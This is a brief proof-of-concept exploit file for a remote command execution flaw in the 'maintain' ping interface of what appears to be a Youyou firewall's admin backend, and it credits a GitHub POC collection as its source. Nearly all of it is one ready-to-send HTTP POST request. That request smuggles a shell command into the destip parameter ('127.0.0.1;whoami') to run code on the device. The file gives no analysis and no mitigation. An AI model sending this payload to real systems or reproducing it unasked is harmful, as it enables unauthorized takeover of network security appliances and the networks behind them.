# youyou_maintain_rce

from: https://github.com/wy876/POC/blob/main/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99%E5%90%8E%E5%8F%B0%E6%8E%A5%E5%8F%A3maintain%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

```
POST /index.php?c=maintain&a=ping HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: your-cookie
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

interface=&destip=127.0.0.1;whoami
```
